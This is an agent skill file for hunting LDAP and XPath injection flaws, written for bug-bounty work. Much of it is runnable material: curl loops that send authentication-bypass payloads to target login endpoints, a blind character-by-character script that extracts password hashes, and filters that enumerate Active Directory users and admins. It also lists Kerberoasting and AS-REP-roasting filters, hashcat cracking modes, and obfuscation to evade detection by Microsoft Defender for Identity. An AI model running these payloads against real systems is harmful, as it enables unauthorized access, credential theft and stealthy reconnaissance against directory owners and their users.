# Upstream source: ldap (hunting)

Original path: `/tmp/h1res_MrPsycho04_Hunting-Agent/ldap/SKILL.md`

---

---
name: ldap
description: "Hunt LDAP Injection and XPath Injection — authentication bypass, blind char-by-char attribute exfiltration, AD user/group enumeration, XML-store XPath bypass. Covers the LDAP special-character set (* ( ) \\ NUL /), search-filter-context vs DN-injection, parenthesis-balancing, AND/OR filter logic, and {SSHA}/{CRYPT} userPassword exfil on non-AD directories. Use when target uses LDAP/AD authentication, corporate SSO with a directory backend, an address-book/people-search API, or XML-based data stores queried with XPath."
---

# HUNT-LDAP — LDAP Injection & XPath Injection

> Grounding note: LDAP injection is rarely disclosed with verbatim payloads on
> public platforms (most live on internal-pentest reports). This skill is
> grounded in the **OWASP LDAP Injection Prevention / Testing Guide
> (WSTG-INPV-06)**, **PortSwigger Web Security Academy (LDAP injection)**, and
> the **RFC 4515** filter grammar — all publicly verifiable references rather
> than invented HackerOne IDs. Do not cite a report you cannot link.

## Crown Jewel Targets

LDAP injection that bypasses authentication = **Critical**. Blind attribute
exfiltration of credentials/secrets = **High**. AD enumeration alone = Medium-High.

**Highest-value chains:**
- **LDAP auth bypass** — close the `uid` filter and append an always-true OR so the
  bind/search returns the admin entry without a valid password.
- **Blind attribute exfil** — char-by-char extraction of an attribute value via a
  boolean oracle (login success/failure, result count, or response length).
- **userPassword hash exfil (non-AD only)** — on OpenLDAP/389-DS the
  `userPassword` attribute can hold `{SSHA}`/`{CRYPT}` hashes that ARE readable
  by query. See the AD-vs-generic warning below.
- **XPath injection auth bypass** — `' or '1'='1` against XML-backed auth.

---

## CRITICAL — Active Directory vs generic LDAP

Do **not** conflate the two. They behave very differently:

| | Generic LDAP (OpenLDAP, 389-DS, ApacheDS) | Active Directory |
|---|---|---|
| Password attribute | `userPassword` — may hold `{SSHA}`/`{MD5}`/`{CRYPT}` and **is readable** if ACL allows | `unicodePwd` — **write-only**, never returned by any search |
| Hash exfil via injection | **Possible** where ACLs leak `userPassword` | **Not possible** — there is no readable hash attribute over LDAP |
| Useful enum attrs | `uid`, `cn`, `mail`, `userPassword` | `sAMAccountName`, `userPrincipalName`, `mail`, `memberOf`, `description` (often holds plaintext secrets!) |

**Do not tell a reader that blind LDAP injection yields AD password hashes — it
does not.** `unicodePwd` is write-only. Against AD, the win is enumeration
(`sAMAccountName`, `memberOf`, `description`/`info` fields that admins misuse to
store passwords) and auth bypass — not hash dumping. The hash-exfil technique
applies **only** to non-AD directories exposing `userPassword`.

---

## Attack Surface Signals

```
Corporate SSO / intranet login pages (often legacy Java/Spring/PHP)
Windows + IIS + "integrated" directory auth
/api/ldap/*  /api/directory/*  /people  /address-book  /search?dir=
"Find a colleague" / org-chart / employee-search features
XML-backed config or auth → XPath injection candidate
Error strings that confirm an LDAP backend:
  javax.naming.NameNotFoundException
  javax.naming.directory.InvalidSearchFilterException
  LDAP: error code 49 - 80090308  (AD invalid creds / bind failure)
  com.sun.jndi.ldap.*  /  System.DirectoryServices  /  ldap_search():
  "Bad search filter"  /  net.ldap (Go)  /  python-ldap SERVER_DOWN
```

---

## LDAP filter grammar (RFC 4515) — why injection works

A login filter is typically built by string-concat:

```
(&(uid=<USERNAME>)(userPassword=<PASSWORD>))
```

`&` = AND, `|` = OR, `!` = NOT. **Filters are prefix/Polish notation** — the
operator comes first and every sub-filter is parenthesised. To inject you must
(a) escape the current `(uid=...)` group, (b) inject your own logic, and
(c) leave the overall parenthesis count **balanced** or the server throws a
filter-syntax error instead of executing.

### The special-character set — TEST EACH ONE

These characters are syntactically meaningful and MUST be escaped by a safe app
(RFC 4515 §3). If the app reflects an error or behaves differently when you send
them raw, the input is unescaped → injectable:

| Char | Filter escape | Why it matters |
|------|---------------|----------------|
| `*`  | `\2a` | wildcard — matches any value |
| `(`  | `\28` | opens a filter group |
| `)`  | `\29` | closes a filter group |
| `\`  | `\5c` | escape char itself |
| NUL  | `\00` | string terminator — truncates filter in C-backed servers |
| `/`  | (DN context) | RDN separator — relevant for DN injection |

**Search-filter context vs DN injection** are different bugs:
- **Search-filter injection** (most common): your input lands inside a
  `(attr=VALUE)` filter. Payloads use `* ( ) & | !`.
- **DN injection**: your input is concatenated into a Distinguished Name
  (`uid=VALUE,ou=people,dc=corp`). Here `,` `=` `+` `"` `\` `<` `>` `;` and `/`
  matter, and a `*` is NOT a wildcard. Test both — the payloads do not transfer.

---

## Step-by-Step Hunting Methodology

### Phase 1 — Confirm an LDAP backend (baseline first)

```bash
# ALWAYS capture a control response first — you compare everything to this.
BASE=$(curl -s -o /dev/null -w "%{http_code}|%{size_download}|%{time_total}" \
  -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"validlookinguser","password":"wrongpass"}')
echo "BASELINE (valid-format, wrong pw): $BASE"

# Send a single unbalanced paren. A SAFE (escaping) app → identical baseline.
# An INJECTABLE app → 500 / filter-syntax error / different size.
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"test)","password":"x"}' | grep -iE \
  "naming|InvalidSearchFilter|error code 49|Bad search filter|jndi|ldap_search"
```

A lone `)` that produces a syntax error/500 while a balanced payload does not is
the cleanest LDAP-injection tell — note it, you will need it as proof.

### Phase 2 — Auth-bypass payloads (balance your parentheses)

```bash
# Target filter assumed: (&(uid=USERNAME)(userPassword=PASSWORD))
# Goal: make the uid sub-filter always-true and neutralise the password clause.

# Wildcard-everything (works when password clause is dropped by a trailing comment-like break):
#   username = *)(uid=*))(|(uid=*    password = anything
# Always-true admin (OR uid=*):
#   username = admin)(|(uid=*)       (note: leaves one extra ')' — see below)
# NUL-truncate the password clause (C-backed servers):
#   username = admin)(uid=*))%00      password = x

USERNAME_PAYLOADS=(
  'admin))(|(uid=*'        # close uid + close &, open OR uid=* — balance check below
  '*)(uid=*))(|(uid=*'     # full always-true, self-balancing classic
  'admin)(!(userPassword=ZZZ))'  # AND NOT a password that is never set → always true
  'admin*'                 # simple wildcard suffix — try first, lowest noise
)

for P in "${USERNAME_PAYLOADS[@]}"; do
  R=$(curl -s -w "|%{http_code}|%{size_download}" -X POST https://$TARGET/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":$(python3 -c 'import json,sys;print(json.dumps(sys.argv[1]))' "$P"),\"password\":\"anything\"}")
  echo "PAYLOAD: $P"
  echo "RESP:    ${R: -40}"
  echo "BASE:    $BASE   <-- compare http_code+size to rule out false positive"
  echo "---"
done
```

**Parenthesis-balancing rule of thumb:** count `(` minus `)` in the *resulting*
full filter, not just your payload. If the app appends `)(userPassword=...))`
after your input, leave the right number of trailing `)` so the final string is
balanced. An unbalanced filter = syntax error = NOT a bypass (false positive).

### Phase 3 — Blind exfil with a CONTROLLED oracle (not raw byte-count)

Raw `size_download` diffing is noise-prone (WAF banners, CSRF tokens, timestamps,
length-jitter on the injected char itself). Use a **paired true/false control**
so the oracle is the *response*, not the absolute size.

```bash
# Oracle pair: a known-TRUE filter and a known-FALSE filter on a public attr.
# TRUE : admin)(uid=*))(|(uid=*     -> entry exists
# FALSE: admin)(uid=NONEXIST_ZZZ))(|(uid=NONEXIST_ZZZ
probe () {  # $1 = filter-tail payload -> prints normalized size
  curl -s -o /dev/null -w "%{size_download}" -X POST https://$TARGET/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$1\",\"password\":\"x\"}"
}
T=$(probe 'admin)(uid=*))(|(uid=*')
F=$(probe 'admin)(uid=NONEXIST_ZZZ))(|(uid=NONEXIST_ZZZ')
echo "TRUE-class size=$T  FALSE-class size=$F"
[ "$T" = "$F" ] && { echo "No length oracle — try a STATUS or BODY-MARKER oracle, or OOB."; exit; }

# Now extract char-by-char. The boolean test compares against $T/$F, NOT a guess.
# Filter: (&(uid=admin)(userPassword=<PREFIX><CHAR>*))  on a NON-AD directory.
PREFIX=""
for pos in $(seq 1 32); do
  for C in {a..z} {A..Z} {0..9} '$' '/' '.' '+' '=' '{' '}'; do
    S=$(probe "admin)(userPassword=${PREFIX}${C}*))(|(uid=*")
    if [ "$S" = "$T" ]; then PREFIX="${PREFIX}${C}"; echo "[$pos] -> $PREFIX"; break; fi
  done
done
echo "RECOVERED: $PREFIX"
```

False-positive guards for blind exfil:
- **Repeat each positive char 3x** and confirm the size is stable — length-jitter
  from the attacker-controlled char itself is the #1 false positive.
- Confirm the **FALSE control still returns the FALSE size** after each round (the
  app didn't just start erroring on every request — WAF block looks like a match).
- If body length is unreliable, switch the oracle to **HTTP status**, a **body
  marker string** (`"Invalid credentials"` present/absent), or **timing** with a
  heavy filter — but only after establishing a stable baseline delta.

### Phase 4 — XPath injection (XML-backed auth)

```bash
# Normal: //users/user[name/text()='ADMIN' and password/text()='PASS']
# Bypass closes the name predicate and OR-trues the whole expression.
XPATH_PAYLOADS=(
  "' or '1'='1"
  "' or ''='"
  "admin' or '1'='1' or 'a'='b"     # keeps quoting balanced
  "x'] | //user/* | //user[name()='x"  # blind: dump all user nodes (XPath has no comments)
  "*[contains(name(),'pass')]"          # node-name discovery
)
for P in "${XPATH_PAYLOADS[@]}"; do
  E=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "$P")
  R=$(curl -s -w "|%{http_code}|%{size_download}" -X POST https://$TARGET/api/login \
    --data-urlencode "username=$P" --data-urlencode "password=x")
  echo "$P  ->  ${R: -24}"
done
# XPath has NO comment syntax — you must keep quotes/brackets balanced, unlike SQLi.
```

### Phase 5 — AD enumeration via wildcard (count oracle, with control)

```bash
# Establish that prefix='zzqx' (unlikely) returns ~0 and prefix='a' returns more.
# A directory that returns the SAME count for both is NOT leaking via wildcard.
count () { curl -s -X POST https://$TARGET/api/directory/search \
  -H "Content-Type: application/json" -d "{\"filter\":\"(sAMAccountName=$1*)\"}" \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);print(len(d.get("results",d.get("users",[]))))' 2>/dev/null; }
CTRL=$(count "zzqx_unlikely")
echo "control count (should be ~0): $CTRL"
for L in {a..z}; do echo "$L* -> $(count $L)  (vs control $CTRL)"; done
# Then pivot to memberOf / description for privileged accounts:
#   (&(sAMAccountName=*)(memberOf=*Domain Admins*))
#   (description=*pw*)   (description=*pass*)   — admins stash secrets here
```

### Phase 6 — Tooling & OOB confirmation

```bash
# Validate the inferred filter directly if you ever get LDAP creds / a bind:
ldapsearch -x -H ldap://$AD_HOST -D "CORP\\user" -w "$PW" \
  -b "dc=corp,dc=local" "(&(objectClass=user)(sAMAccountName=admin*))" sAMAccountName memberOf

# Burp: Intruder over the char set for blind exfil; the Web Security Academy
# "Blind LDAP injection" labs mirror the Phase-3 oracle exactly.
# OOB (rare but decisive): some JNDI/LDAP stacks resolve a referral. If you can
# inject a referral/URL the server dereferences, point it at Collaborator:
#   (uid=*))(referral=ldap://<COLLAB>/x)   — a DNS/LDAP hit at Collaborator
# is server-side proof with zero ambiguity. Treat any Collaborator interaction
# as the gold-standard confirmation for otherwise-blind cases.
```

---

## Chain Table

| LDAP finding | Chain to | Impact |
|--------------|----------|--------|
| Auth-bypass (always-true filter) | Admin/SSO panel as first directory entry | Critical |
| AD enumeration (`sAMAccountName`) | Username list → password spray / credential stuffing | Mass-ATO risk |
| `memberOf` enumeration | Identify Domain Admins → targeted phishing/spray | Targeted compromise |
| `description`/`info` field read | Plaintext creds admins stashed there | Direct credential leak |
| Blind exfil of `userPassword` **(non-AD only)** | `{SSHA}` (salted SHA-1) → hashcat `-m 111` (`{SSHA256}`=1411, `{SSHA512}`=1711); `{CRYPT}` → mode depends on the `$id$` prefix (`$1$`=500, `$6$`=1800) → offline crack | High |
| LDAP referral → Collaborator | Server-side request / internal directory reach | SSRF-class, confirms blind |

> AD has no readable password attribute — do not list "extract AD hashes" as a
> chain. Against AD, the credential win comes from `description`/`info` misuse or
> from enumerated usernames feeding a spray, never from `unicodePwd`.

---

## Validation — rule out the false positive BEFORE you report

A "bypass" or "match" is only real once you have eliminated syntax-error,
WAF-block, and length-jitter explanations.

- [ ] **Auth bypass:** the always-true payload returns a **valid authenticated
      session** (session cookie + access to a post-login resource), and the same
      request with one paren removed returns a **filter-syntax error** — proving
      the filter parsed and executed, not that the app fell open on every input.
- [ ] **Negative control:** an equivalently-shaped but logically-FALSE payload
      (`)(uid=NONEXISTENT_ZZZ)`) returns the **failure** response. If both
      true-class and false-class "succeed", you found a broken endpoint, not LDAP
      injection.
- [ ] **Blind exfil:** each recovered char reproduces 3x with stable size; the
      FALSE control still reads FALSE between rounds; recovered value verified by
      a direct lookup or by the auth-bypass payload that uses it.
- [ ] **XPath:** quotes/brackets remained balanced (no 500), and the bypass logged
      in to a real account context — not just a different error page.
- [ ] **OOB where possible:** a Collaborator DNS/LDAP interaction from a referral
      payload is decisive for blind cases — prefer it over length-only inference.
- [ ] **AD claim discipline:** if you say "AD", you enumerated AD-specific attrs
      (`sAMAccountName`/`memberOf`); never claim AD hash exfil.

**Severity:**
- Auth bypass landing as admin/privileged directory entry: **Critical**
- `userPassword` hash exfil (non-AD) or `description`-field credential read: **High**
- AD user/group enumeration only: **Medium-High**
- Blind boolean oracle confirmed but no useful attribute reachable: **Medium**

---

## Web-Research Methodology Additions (2026)

### A. Discovery checklist — concrete places, params, headers, file types to look
- LDAP-backed surfaces: corporate SSO/intranet login, "find a colleague"/org-chart/address-book search, group-membership checks, and any legacy Java/Spring/PHP or Windows/IIS "integrated auth" form.
- Common endpoints: `/api/ldap/*`, `/api/directory/*`, `/people`, `/address-book`, `/search?dir=`, `/ldapsearch?user=`, `phpLDAPadmin` (`intitle:"phpLDAPadmin" inurl:cmd.php`).
- Confirm the backend from error strings: `javax.naming.NameNotFoundException`, `javax.naming.directory.InvalidSearchFilterException`, `LDAP: error code 49 - 80090308`, `com.sun.jndi.ldap.*`, `System.DirectoryServices`, `ldap_search()`, `Bad search filter`, `python-ldap SERVER_DOWN`, `net.ldap` (Go).
- Distinguish AD from generic LDAP immediately (`sAMAccountName`/`memberOf`/`unicodePwd` vs `uid`/`userPassword`) — the payloads and the achievable impact differ.
- XPath injection lives in the same skill family: XML-backed auth/config, `//users/user[name/text()='...']`, and any XML data store queried with concatenated XPath.
- Look for double-decoding layers: client-side validation of a first-decoded username followed by a second server-side decode before filter construction is a real, documented bypass (HackTricks / HTB Hercules).
- Check whether the login is search-then-bind or search-only — a widened search alone does not bypass a later password bind. Only authorization checks that trust the search filter as the sole gate are bypassable.
- Zimbra-style edge case: wildcard in an unescaped login changes which entry is selected; with external LDAP auth + lazy auto-provisioning this becomes a password-response oracle, and local per-account lockout does not apply when no local account exists.

### B. Techniques & bypasses — specific actionable techniques/payload shapes
- RFC 4515 special-character set to test individually: `*` → `\2a`, `(` → `\28`, `)` → `\29`, `\` → `\5c`, NUL → `\00`; DN context additionally uses `,`, `=`, `+`, `"`, `<`, `>`, `;`, `/` and `*` is NOT a wildcard there.
- A lone unbalanced `)` producing a 500/filter-syntax error while a balanced payload does not is the cleanest injection tell — capture it as proof.
- Classic self-balancing auth bypass for `(&(uid=USER)(userPassword=PASS))`: username `*)(uid=*))(|(uid=*`, any password. Resulting filter is syntactically valid and always true.
- Additional auth-bypass forms (try all; parser behaviour varies): `admin)(&)`, `admin)(!(userPassword=ZZZ))`, `*)(userPassword=*)`, `admin))(|(|`, and NUL truncation `*))%00`.
- Group-gate bypass in search-then-bind templates when the filter is the sole authorization check: template `(&(uid={username})(memberOf=cn=app-users,dc=example,dc=com))`, username `targetuser)(|(uid=targetuser` — keeps one balanced root and makes the inner OR true. Requires the user's real password for the bind.
- `(&)` and `(|)` are NOT portable absolute true/false filters per RFC 4515 grammar (no child filters) — some servers error, SunOne executes both filters, OpenLDAP executes only the first. Keep one balanced root expression.
- Blind true/false oracles with paired controls: TRUE `)(objectClass=*))(&objectClass=void`, FALSE `void)(objectClass=void))(&objectClass=void`; then char-by-char `(&(sn=administrator)(password=M*))`.
- Double-decoding bypass: send `%252A` (→ `%2A` → `*`), and probe prefix fragments such as `*)(sAMAccountName=a*` against an impossible prefix.
- Extra-bind timing oracle: a zero-match search and a match+wrong-password bind return the same failure, but the latter costs an extra LDAP round trip — compare repeated latency for a candidate prefix vs an impossible one, and confirm with directory logs.
- XPath equivalents: `' or '1'='1`, `' or ''='`, `admin' or '1'='1' or 'a'='b`, `x'] | //user/* | //user[name()='x` for blind node enumeration. XPath has no comment syntax — keep quotes/brackets balanced.
- AD enumeration filters: `(&(objectClass=user)(objectCategory=person)(adminCount=1))`, `(userAccountControl:1.2.840.113556.1.4.803:=4194304)` (AS-REP roastable), `(serviceprincipalname=*)` for Kerberoasting, `(description=*pw*)` and `(description=*pass*)` for secrets admins stash in descriptions.
- OPSEC-aware AD enumeration: hex-encode filter values (`\64\6F\6D\61\69\6E`), append junk after a wildcard (ANR ignores it), or use OID notation and comparison-operator obfuscation to reduce MDI detection/logging (2NS, 2025).

### C. Validation / proof bar — how to confirm and avoid false positives
- A "bypass" is real only if it returns a valid authenticated session (session cookie + access to a post-login resource), not merely a different error page.
- Negative control: an equally-shaped but logically FALSE payload (`)(uid=NONEXISTENT_ZZZ)`) must return the failure response. If both classes "succeed", the endpoint is simply broken.
- Positive control: removing one parenthesis from the successful payload should produce a filter-syntax error — proving the filter was parsed and executed.
- Blind exfil: each recovered character must reproduce 3× with a stable oracle; the FALSE control must remain FALSE between rounds. WAF blocks often masquerade as matches.
- Never claim AD password-hash exfiltration: `unicodePwd` is write-only. The credential win against AD is `description`/`info` misuse or enumerated usernames feeding a spray.
- If you say "Active Directory", demonstrate AD-specific attributes (`sAMAccountName`, `memberOf`, `serviceprincipalname`); generic `uid`/`cn` proves only an LDAP-like directory.
- PortSwigger explicitly warns that difference-based LDAP scanner results are unreliable — manually review with controls before reporting.
- Timing oracles must be repeated and cross-checked against directory logs or another signal; network jitter and automated response-diffing mislead.
- XPath: verify quotes/brackets stayed balanced (no 500) and the bypass landed in a real account context, not just a different error.
- Severity: auth bypass landing as admin → Critical; non-AD `userPassword` hash read or `description` credential read → High; user/group enumeration only → Medium-High; blind oracle with no useful attribute → Medium.

**Full LDAP special-character reference (test each in both filter and DN context):**
- Filter context: `*` wildcard, `(` `)` grouping, `&` AND, `|` OR, `!` NOT, `~=`, `>=`, `<=`, `=`, NUL.
- DN context: `,` RDN separator, `=` attribute/value, `+` multi-valued RDN, `"` quoting, `\` escaping, `<` `>`, `;`, `/`.
- RFC 4515 hex escapes to try raw and double-encoded: `\2a`, `\28`, `\29`, `\5c`, `\00`; double-encoded `%252A` → `%2A` → `*`.
- Search-filter operator set from OWASP WSTG: `~=` approximate, `>=`/`<=` range, `*` any character, `()` grouping.

**Attribute brute-force list for blind extraction (HackTricks script pattern):**
- Generic: `c`, `cn`, `commonName`, `dc`, `givenName`, `mail`, `mobile`, `name`, `o`, `ou`, `owner`, `sn`, `surname`, `uid`, `username`, `userPassword`, `description`, `info`.
- Active Directory: `sAMAccountName`, `userPrincipalName`, `memberOf`, `adminCount`, `serviceprincipalname`, `userAccountControl`, `badpwdcount`, `msDS-AllowedToDelegateTo`.
- The extraction loop: for each attribute, iterate charset positions with `*)({attribute}={value}{char}*` and compare against the established TRUE response.

**Filter-grammar discipline:**
- Filters are prefix/Polish notation: `(&(a=1)(b=2))`, `(|(a=1)(b=2))`, `(!(a=1))`.
- Always count `(` minus `)` in the *resulting full filter*, including whatever the app appends after your input.
- One balanced root expression is safest — some servers reject trailing or multiple filters outright.
- `&` and `|` with no children are not RFC-valid; treat them as server-specific quirks, not portable primitives.
- Escape-then-validate ordering matters: if the app strips metacharacters once and then builds the filter, nesting the stripped token inside itself can leave a live metacharacter.
- OWASP Core Rule Set rule 921200 flags LDAP operator patterns in user-supplied fields at Paranoia Level 1 — a 403 from this rule is a WAF signal, not evidence about the backend.

### D. Sources — numbered list of URLs you actually fetched
1. https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html
2. https://hacktricks.wiki/en/pentesting-web/ldap-injection.html
